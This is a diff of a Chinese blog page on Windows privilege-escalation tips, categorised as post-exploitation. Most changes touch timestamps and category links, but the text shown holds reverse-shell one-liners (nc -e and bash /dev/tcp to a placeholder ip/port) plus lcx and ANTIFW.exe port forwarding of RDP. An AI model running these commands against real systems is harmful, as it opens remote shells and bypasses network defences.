@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-03T08:52:52.343Z">
+<meta property="og:updated_time" content="2019-09-03T11:55:05.474Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Win 提权技巧">
 <meta name="twitter:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
@@ -357,12 +357,56 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T16:52:52+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T19:55:05+08:00">
                 2019-09-03
               </time>
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后渗透/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后渗透/内网渗透/提权-系统级/" itemprop="url" rel="index">
+                    <span itemprop="name">提权(系统级)</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -446,7 +490,7 @@
       
         <h1 id="端口转发类"><a href="#端口转发类" class="headerlink" title="端口转发类"></a>端口转发类</h1><h3 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h3><pre><code>shell： nc -e cmd ip port
 shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)</code></pre><h3 id="服务器：-nc-vv-lp-port"><a href="#服务器：-nc-vv-lp-port" class="headerlink" title="服务器： nc -vv -lp port"></a>服务器： nc -vv -lp port</h3><h2 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h2><pre><code>shell: lcx -slave ip port 127.0.0.1 port</code></pre><h3 id="服务器：-lcx-listen-port-33891"><a href="#服务器：-lcx-listen-port-33891" class="headerlink" title="服务器： lcx -listen port 33891"></a>服务器： lcx -listen port 33891</h3><pre><code>ANTIFW.exe -s #运行程序，将3389转发到80
-ANTIFW.exe -l #关闭程序，恢复iis</code></pre><h1 id="cmd探查"><a href="#cmd探查" class="headerlink" title="cmd探查"></a>cmd探查</h1><h2 id="信息探测类"><a href="#信息探测类" class="headerlink" title="信息探测类"></a>信息探测类</h2><pre><code>systeminfo ：查看系统版本信息
+ANTIFW.exe -l #关闭程序，恢复</code></pre><h1 id="cmd探查"><a href="#cmd探查" class="headerlink" title="cmd探查"></a>cmd探查</h1><h2 id="信息探测类"><a href="#信息探测类" class="headerlink" title="信息探测类"></a>信息探测类</h2><pre><code>systeminfo ：查看系统版本信息
 
 netstat -ano : 查看系统开放端口
 
@@ -678,12 +722,21 @@ drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" cla
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
             
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
             
 
           </nav>
